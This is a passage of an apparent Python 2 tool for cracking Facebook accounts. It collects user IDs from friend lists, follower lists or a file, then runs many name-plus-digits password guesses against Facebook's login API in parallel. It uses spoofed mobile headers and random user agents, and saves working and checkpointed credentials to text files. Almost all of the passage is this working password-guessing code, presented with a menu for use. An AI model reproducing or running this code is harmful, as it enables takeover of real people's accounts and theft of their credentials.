                                            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                            'user-agent': _azimua,
                                            'content-type': 'application/x-www-form-urlencoded',
                                            'x-fb-http-engine': 'Liger' }
                                        data = requests.get(api, params = params, headers = headers_)
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass12 + '\x1b[0;97m'
                                            ok = open('ok.txt', 'a')
                                            ok.write(uid + '|' + pass12 + '\n')
                                            ok.close()
                                            oks.append(uid + pass12)
                                        elif 'www.facebook.com' in data.json()['error_msg']:
                                            print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass12 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass12 + '\n')
                                            cp.close()
                                            cps.append(uid + pass12)
                                        else:
                                            pass13 = name.lower().split(' ')[0] + '2003'
                                        api = 'https://b-api.facebook.com/method/auth.login'
                                        params = {
                                            'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                                            'format': 'JSON',
                                            'sdk_version': '2',
                                            'email': uid,
                                            'locale': 'en_US',
                                            'password': pass13,
                                            'sdk': 'ios',
                                            'generate_session_cookies': '1',
                                            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                                        headers_ = {
                                            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                            'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                            'x-fb-net-hni': str(random.randint(20000, 40000)),
                                            'x-fb-connection-quality': 'EXCELLENT',
                                            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                            'user-agent': _azimua,
                                            'content-type': 'application/x-www-form-urlencoded',
                                            'x-fb-http-engine': 'Liger' }
                                        data = requests.get(api, params = params, headers = headers_)
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass13 + '\x1b[0;97m'
                                            ok = open('ok.txt', 'a')
                                            ok.write(uid + '|' + pass13 + '\n')
                                            ok.close()
                                            oks.append(uid + pass13)
                                        elif 'www.facebook.com' in data.json()['error_msg']:
                                            print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass13 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass13 + '\n')
                                            cp.close()
                                            cps.append(uid + pass13)
                                        else:
                                            pass14 = name.lower().split(' ')[0] + '2004'
                                        api = 'https://b-api.facebook.com/method/auth.login'
                                        params = {
                                            'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                                            'format': 'JSON',
                                            'sdk_version': '2',
                                            'email': uid,
                                            'locale': 'en_US',
                                            'password': pass14,
                                            'sdk': 'ios',
                                            'generate_session_cookies': '1',
                                            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                                        headers_ = {
                                            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                            'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                            'x-fb-net-hni': str(random.randint(20000, 40000)),
                                            'x-fb-connection-quality': 'EXCELLENT',
                                            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                            'user-agent': _azimua,
                                            'content-type': 'application/x-www-form-urlencoded',
                                            'x-fb-http-engine': 'Liger' }
                                        data = requests.get(api, params = params, headers = headers_)
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass14 + '\x1b[0;97m'
                                            ok = open('ok.txt', 'a')
                                            ok.write(uid + '|' + pass14 + '\n')
                                            ok.close()
                                            oks.append(uid + pass14)
                                        elif 'www.facebook.com' in data.json()['error_msg']:
                                            print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass14 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass14 + '\n')
                                            cp.close()
                                            cps.append(uid + pass14)
                                        else:
                                            pass15 = name.lower().split(' ')[0] + '2005'
                                        api = 'https://b-api.facebook.com/method/auth.login'
                                        params = {
                                            'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                                            'format': 'JSON',
                                            'sdk_version': '2',
                                            'email': uid,
                                            'locale': 'en_US',
                                            'password': pass15,
                                            'sdk': 'ios',
                                            'generate_session_cookies': '1',
                                            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                                        headers_ = {
                                            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                            'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                            'x-fb-net-hni': str(random.randint(20000, 40000)),
                                            'x-fb-connection-quality': 'EXCELLENT',
                                            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                            'user-agent': _azimua,
                                            'content-type': 'application/x-www-form-urlencoded',
                                            'x-fb-http-engine': 'Liger' }
                                        data = requests.get(api, params = params, headers = headers_)
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass15 + '\x1b[0;97m'
                                            ok = open('ok.txt', 'a')
                                            ok.write(uid + '|' + pass15 + '\n')
                                            ok.close()
                                            oks.append(uid + pass15)
                                        elif 'www.facebook.com' in data.json()['error_msg']:
                                            print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass15 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass15 + '\n')
                                            cp.close()
                                            cps.append(uid + pass15)
                                        else:
                                            pass16 = name.lower().split(' ')[0] + '2006'
                                        api = 'https://b-api.facebook.com/method/auth.login'
                                        params = {
                                            'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                                            'format': 'JSON',
                                            'sdk_version': '2',
                                            'email': uid,
                                            'locale': 'en_US',
                                            'password': pass16,
                                            'sdk': 'ios',
                                            'generate_session_cookies': '1',
                                            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                                        headers_ = {
                                            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                            'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                            'x-fb-net-hni': str(random.randint(20000, 40000)),
                                            'x-fb-connection-quality': 'EXCELLENT',
                                            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                            'user-agent': _azimua,
                                            'content-type': 'application/x-www-form-urlencoded',
                                            'x-fb-http-engine': 'Liger' }
                                        data = requests.get(api, params = params, headers = headers_)
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass16 + '\x1b[0;97m'
                                            ok = open('ok.txt', 'a')
                                            ok.write(uid + '|' + pass16 + '\n')
                                            ok.close()
                                            oks.append(uid + pass16)
                                        elif 'www.facebook.com' in data.json()['error_msg']:
                                            print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass16 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass16 + '\n')
                                            cp.close()
                                            cps.append(uid + pass16)
                                        else:
                                            pass17 = name.lower().split(' ')[0] + '2007'
                                        api = 'https://b-api.facebook.com/method/auth.login'
                                        params = {
                                            'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                                            'format': 'JSON',
                                            'sdk_version': '2',
                                            'email': uid,
                                            'locale': 'en_US',
                                            'password': pass17,
                                            'sdk': 'ios',
                                            'generate_session_cookies': '1',
                                            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                                        headers_ = {
                                            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                            'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                            'x-fb-net-hni': str(random.randint(20000, 40000)),
                                            'x-fb-connection-quality': 'EXCELLENT',
                                            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                            'user-agent': _azimua,
                                            'content-type': 'application/x-www-form-urlencoded',
                                            'x-fb-http-engine': 'Liger' }
                                        data = requests.get(api, params = params, headers = headers_)
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass17 + '\x1b[0;97m'
                                            ok = open('ok.txt', 'a')
                                            ok.write(uid + '|' + pass17 + '\n')
                                            ok.close()
                                            oks.append(uid + pass17)
                                        elif 'www.facebook.com' in data.json()['error_msg']:
                                            print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass17 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass17 + '\n')
                                            cp.close()
                                            cps.append(uid + pass17)
                                        else:
                                            pass18 = name.lower().split(' ')[0] + '1997'
                                        api = 'https://b-api.facebook.com/method/auth.login'
                                        params = {
                                            'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                                            'format': 'JSON',
                                            'sdk_version': '2',
                                            'email': uid,
                                            'locale': 'en_US',
                                            'password': pass18,
                                            'sdk': 'ios',
                                            'generate_session_cookies': '1',
                                            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                                        headers_ = {
                                            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                            'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                            'x-fb-net-hni': str(random.randint(20000, 40000)),
                                            'x-fb-connection-quality': 'EXCELLENT',
                                            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                            'user-agent': _azimua,
                                            'content-type': 'application/x-www-form-urlencoded',
                                            'x-fb-http-engine': 'Liger' }
                                        data = requests.get(api, params = params, headers = headers_)
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass18 + '\x1b[0;97m'
                                            ok = open('ok.txt', 'a')
                                            ok.write(uid + '|' + pass18 + '\n')
                                            ok.close()
                                            oks.append(uid + pass18)
                                        elif 'www.facebook.com' in data.json()['error_msg']:
                                            print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass18 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass18 + '\n')
                                            cp.close()
                                            cps.append(uid + pass18)
                                        else:
                                            pass19 = name.lower().split(' ')[0] + '1996'
                                        api = 'https://b-api.facebook.com/method/auth.login'
                                        params = {
                                            'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                                            'format': 'JSON',
                                            'sdk_version': '2',
                                            'email': uid,
                                            'locale': 'en_US',
                                            'password': pass19,
                                            'sdk': 'ios',
                                            'generate_session_cookies': '1',
                                            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                                        headers_ = {
                                            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                            'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                            'x-fb-net-hni': str(random.randint(20000, 40000)),
                                            'x-fb-connection-quality': 'EXCELLENT',
                                            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                            'user-agent': _azimua,
                                            'content-type': 'application/x-www-form-urlencoded',
                                            'x-fb-http-engine': 'Liger' }
                                        data = requests.get(api, params = params, headers = headers_)
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass19 + '\x1b[0;97m'
                                            ok = open('ok.txt', 'a')
                                            ok.write(uid + '|' + pass19 + '\n')
                                            ok.close()
                                            oks.append(uid + pass19)
                                        elif 'www.facebook.com' in data.json()['error_msg']:
                                            print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass19 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass19 + '\n')
                                            cp.close()
                                            cps.append(uid + pass19)
                                        else:
                                            pass20 = name.lower().split(' ')[0] + '1995'
                                        api = 'https://b-api.facebook.com/method/auth.login'
                                        params = {
                                            'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                                            'format': 'JSON',
                                            'sdk_version': '2',
                                            'email': uid,
                                            'locale': 'en_US',
                                            'password': pass20,
                                            'sdk': 'ios',
                                            'generate_session_cookies': '1',
                                            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                                        headers_ = {
                                            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                            'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                            'x-fb-net-hni': str(random.randint(20000, 40000)),
                                            'x-fb-connection-quality': 'EXCELLENT',
                                            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                            'user-agent': _azimua,
                                            'content-type': 'application/x-www-form-urlencoded',
                                            'x-fb-http-engine': 'Liger' }
                                        data = requests.get(api, params = params, headers = headers_)
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass20 + '\x1b[0;97m'
                                            ok = open('ok.txt', 'a')
                                            ok.write(uid + '|' + pass20 + '\n')
                                            ok.close()
                                            oks.append(uid + pass20)
                                        elif 'www.facebook.com' in data.json()['error_msg']:
                                            print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass20 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass20 + '\n')
                                            cp.close()
                                            cps.append(uid + pass20)
                                        else:
                                            pass21 = name.lower().split(' ')[0] + '123456'
                                        api = 'https://b-api.facebook.com/method/auth.login'
                                        params = {
                                            'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                                            'format': 'JSON',
                                            'sdk_version': '2',
                                            'email': uid,
                                            'locale': 'en_US',
                                            'password': pass21,
                                            'sdk': 'ios',
                                            'generate_session_cookies': '1',
                                            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                                        headers_ = {
                                            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                            'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                            'x-fb-net-hni': str(random.randint(20000, 40000)),
                                            'x-fb-connection-quality': 'EXCELLENT',
                                            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                            'user-agent': _azimua,
                                            'content-type': 'application/x-www-form-urlencoded',
                                            'x-fb-http-engine': 'Liger' }
                                        data = requests.get(api, params = params, headers = headers_)
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass21 + '\x1b[0;97m'
                                            ok = open('ok.txt', 'a')
                                            ok.write(uid + '|' + pass21 + '\n')
                                            ok.close()
                                            oks.append(uid + pass21)
                                        elif 'www.facebook.com' in data.json()['error_msg']:
                                            print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass21 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass21 + '\n')
                                            cp.close()
                                            cps.append(uid + pass21)
                                        else:
                                            pass22 = name.lower().split(' ')[0] + '123456789'
                                        api = 'https://b-api.facebook.com/method/auth.login'
                                        params = {
                                            'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                                            'format': 'JSON',
                                            'sdk_version': '2',
                                            'email': uid,
                                            'locale': 'en_US',
                                            'password': pass22,
                                            'sdk': 'ios',
                                            'generate_session_cookies': '1',
                                            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
                                        headers_ = {
                                            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                            'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                            'x-fb-net-hni': str(random.randint(20000, 40000)),
                                            'x-fb-connection-quality': 'EXCELLENT',
                                            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                            'user-agent': _azimua,
                                            'content-type': 'application/x-www-form-urlencoded',
                                            'x-fb-http-engine': 'Liger' }
                                        data = requests.get(api, params = params, headers = headers_)
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass22 + '\x1b[0;97m'
                                            ok = open('ok.txt', 'a')
                                            ok.write(uid + '|' + pass22 + '\n')
                                            ok.close()
                                            oks.append(uid + pass22)
                                        elif 'www.facebook.com' in data.json()['error_msg']:
                                            print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass22 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass22 + '\n')
                                            cp.close()
                                            cps.append(uid + pass22)
                                        else:
                                            pass23 = name.lower().split(' ')[0] + '112233'
                                        api = 'https://b-api.facebook.com/method/auth.login'
                                        params = {
                                            'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                                            'format': 'JSON',
                                            'sdk_version': '2',
                                            'email': uid,
                                            'locale': 'en_US',
                                            'password': pass23,
                                            'sdk': 'ios',
                                            'generate_session_cookies': '1',
                                            'sig': '3f555f99fb61fcd7aa0c44f58f523ef6' }
                                        headers_ = {
                                            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                            'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                            'x-fb-net-hni': str(random.randint(20000, 40000)),
                                            'x-fb-connection-quality': 'EXCELLENT',
                                            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                            'user-agent': _azimua,
                                            'content-type': 'application/x-www-form-urlencoded',
                                            'x-fb-http-engine': 'Liger' }
                                        data = requests.get(api, params = params, headers = headers_)
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass23 + '\x1b[0;97m'
                                            ok = open('ok.txt', 'a')
                                            ok.write(uid + '|' + pass23 + '\n')
                                            ok.close()
                                            oks.append(uid + pass23)
                                        elif 'www.facebook.com' in data.json()['error_msg']:
                                            print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass23 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass23 + '\n')
                                            cp.close()
                                            cps.append(uid + pass23)
                                        else:
                                            pass24 = name.lower().split(' ')[0] + '11223344'
                                        api = 'https://b-api.facebook.com/method/auth.login'
                                        params = {
                                            'access_token': '350685531728%7C62f8ce9f74b12f84c124cc24437a4a32',
                                            'format': 'JSON',
                                            'sdk_version': '2',
                                            'email': uid,
                                            'locale': 'en_US',
                                            'password': pass24,
                                            'sdk': 'ios',
                                            'generate_session_cookies': '1',
                                            'sig': '3f555f99fb61fcd7aa0c44f58f524ef6' }
                                        headers_ = {
                                            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                            'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                            'x-fb-net-hni': str(random.randint(20000, 40000)),
                                            'x-fb-connection-quality': 'EXCELLENT',
                                            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                            'user-agent': _azimua,
                                            'content-type': 'application/x-www-form-urlencoded',
                                            'x-fb-http-engine': 'Liger' }
                                        data = requests.get(api, params = params, headers = headers_)
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass24 + '\x1b[0;97m'
                                            ok = open('ok.txt', 'a')
                                            ok.write(uid + '|' + pass24 + '\n')
                                            ok.close()
                                            oks.append(uid + pass24)
                                        elif 'www.facebook.com' in data.json()['error_msg']:
                                            print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass24 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass24 + '\n')
                                            cp.close()
                                            cps.append(uid + pass24)
                                        else:
                                            pass25 = name.lower().split(' ')[0] + '1212'
                                        api = 'https://b-api.facebook.com/method/auth.login'
                                        params = {
                                            'access_token': '350685531728%7C62f8ce9f74b12f84c125cc25437a4a32',
                                            'format': 'JSON',
                                            'sdk_version': '2',
                                            'email': uid,
                                            'locale': 'en_US',
                                            'password': pass25,
                                            'sdk': 'ios',
                                            'generate_session_cookies': '1',
                                            'sig': '3f555f99fb61fcd7aa0c44f58f525ef6' }
                                        headers_ = {
                                            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                            'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                            'x-fb-net-hni': str(random.randint(20000, 40000)),
                                            'x-fb-connection-quality': 'EXCELLENT',
                                            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                            'user-agent': _azimua,
                                            'content-type': 'application/x-www-form-urlencoded',
                                            'x-fb-http-engine': 'Liger' }
                                        data = requests.get(api, params = params, headers = headers_)
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass25 + '\x1b[0;97m'
                                            ok = open('ok.txt', 'a')
                                            ok.write(uid + '|' + pass25 + '\n')
                                            ok.close()
                                            oks.append(uid + pass25)
                                        elif 'www.facebook.com' in data.json()['error_msg']:
                                            print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass25 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass25 + '\n')
                                            cp.close()
                                            cps.append(uid + pass25)
                                        pass26 = name.lower().split(' ')[0] + '0750'
                                        api = 'https://b-api.facebook.com/method/auth.login'
                                        params = {
                                            'access_token': '350685531728%7C62f8ce9f74b12f84c126cc26437a4a32',
                                            'format': 'JSON',
                                            'sdk_version': '2',
                                            'email': uid,
                                            'locale': 'en_US',
                                            'password': pass26,
                                            'sdk': 'ios',
                                            'generate_session_cookies': '1',
                                            'sig': '3f555f99fb61fcd7aa0c44f58f526ef6' }
                                        headers_ = {
                                            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                                            'x-fb-sim-hni': str(random.randint(20000, 40000)),
                                            'x-fb-net-hni': str(random.randint(20000, 40000)),
                                            'x-fb-connection-quality': 'EXCELLENT',
                                            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                                            'user-agent': _azimua,
                                            'content-type': 'application/x-www-form-urlencoded',
                                            'x-fb-http-engine': 'Liger' }
                                        data = requests.get(api, params = params, headers = headers_)
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            print ' \x1b[1;32m[TIGER-OK] ' + uid + ' | ' + pass26 + '\x1b[0;97m'
                                            ok = open('ok.txt', 'a')
                                            ok.write(uid + '|' + pass26 + '\n')
                                            ok.close()
                                            oks.append(uid + pass26)
                                        elif 'www.facebook.com' in data.json()['error_msg']:
                                            print ' \x1b[1;33m[TIGER-CP] ' + uid + ' | ' + pass26 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass26 + '\n')
                                            cp.close()
                                            cps.append(uid + pass26)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print ''
    linex()
    print ''
    print '\x1b[92;1m CRACK KOTAY HAT [!]'
    print '\x1b[93;1m TOTAL \x1b[92;1mOK\x1b[93;1m/\x1b[91;1mCP: ' + str(len(oks)) + '/' + str(len(cps))
    print ''
    linex()
    print ''
    raw_input('\x1b[93;1m ENTER BKA BO GARANAWA [!] ')
    menu()


def crack():
    global token
    os.system('clear')
    
    try:
        token = open('vau_token.txt', 'r').read()
    except IOError:
        print ''
        print '\t\x1b[91;1m  TOKEN HALAEA [!] '
        time.sleep(1)
        fb_token()

    os.system('clear')
    logo()
    print ''
    print '\t\x1b[93;1m  DIGIT PASS CRACKING'
    print ''
    print '\x1b[94;1m  [1] CRACK PUBLIC ID'
    print '\x1b[93;1m  [2] CRACK FOLLOWERS'
    print '\x1b[92;1m  [3] CRACK FILE'
    print ''
    crack_select()

# fucked by Mohammad sultani 

def crack_select():
    select = raw_input('\x1b[92;1m  CHOOSE : ')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        logo()
        print ''
        print '\t\x1b[93;1m  DIGIT PASS CRACKING'
        print ''
        
        try:
            id_limit = int(raw_input('\x1b[93;1m  ENTER LIMIT (\x1b[91;1m5 MAX\x1b[93;1m): \x1b[92;1m'))
            print ''
        except:
            id_limit = 1

        for t in range(id_limit):
            t += 1
            idt = raw_input('\x1b[93;1m  INPUT PUBLIC ID (\x1b[92;1m%s\x1b[93;1m) : \x1b[92;1m' % t)
            
            try:
                for i in requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token).json()['data']:
                    uid = i['id'].encode('utf-8')
                    na = i['name'].encode('utf-8')
                    id.append(uid + '|' + na)
            except KeyError:
                print '\x1b[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE'

            print '\x1b[94;1m  HAMW ID YAKAN  : \x1b[0;92m%s\x1b[0;97m' % len(id)
        
        time.sleep(3)
    elif select == '2':
        os.system('clear')
        logo()
        print ''
        print '\t\x1b[93;1m  DIGIT PASS CRACKING'
        print ''
        
        try:
            id_limit = int(raw_input('\x1b[93;1m  ENTER LIMIT (\x1b[91;1m5 MAX\x1b[93;1m): \x1b[92;1m'))
            print ''
        except:
            id_limit = 1

        for t in range(id_limit):
            t += 1
            idt = raw_input('\x1b[93;1m  INPUT FOLLOWER ID (\x1b[92;1m%s\x1b[93;1m) : \x1b[92;1m' % t)
            
            try:
                for i in requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999').json()['data']:
                    uid = i['id'].encode('utf-8')
                    na = i['name'].encode('utf-8')
                    id.append(uid + '|' + na)
            except KeyError:
                print '\x1b[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE'

            print '\x1b[94;1m  HAMW ID YAKAN  : \x1b[0;92m%s\x1b[0;97m' % len(id)
        
        time.sleep(3)
    elif select == '3':
        os.system('clear')
        logo()
        print ''
        print '\t\x1b[93;1m  DIGIT PASS CRACKING'
        print ''
        filelist = raw_input('\x1b[92;1m  INPUT FILE: ')
        
        try:
            for line in open(filelist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '\t\x1b[91;1m  REQUESTED FILE NOT FOUND'
            print ''
            raw_input('\x1b[93;1m ENTER BKA BO GARANAWA [!]')
            crack()
        
# fucked by Mohammad sultani 


    if select == '0':
        menu()
    else:
        print ''
        print '\t\x1b[91;1m  SELECT VALID OPTION'
        print ''
        crack_select()
    os.system('clear')
    logo()
    print ''
    print '\x1b[93;1m  HAMW ID YAKAN : \x1b[92;1m' + str(len(id))
    print '\x1b[92;1m   CRACK DASTE PE KRD [!]\x1b[0m'
    print '\x1b[94;1m  chaware bka [!] \x1b[92;1m\xe2\x9c\x98\x1b[91;1m\xe2\x9c\x98\x1b[0m'
    linex()
    
    def main(arg):
        user = arg
        (uid, name) = user.split('|')
        _azimua = random.choice([
            'Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]',
            '[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
            'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]',
            'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]',
            'Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]',
            'Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]'])
        
        try:
            pass1 = '1234'
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {
                'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                'format': 'JSON',
                'sdk_version': '2',
                'email': uid,
                'locale': 'en_US',
                'password': pass1,
                'sdk': 'ios',
                'generate_session_cookies': '1',
                'sig': '3f555f99fb61fcd7aa0c44f58f522ef6' }
            headers_ = {
                'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                'user-agent': _azimua,
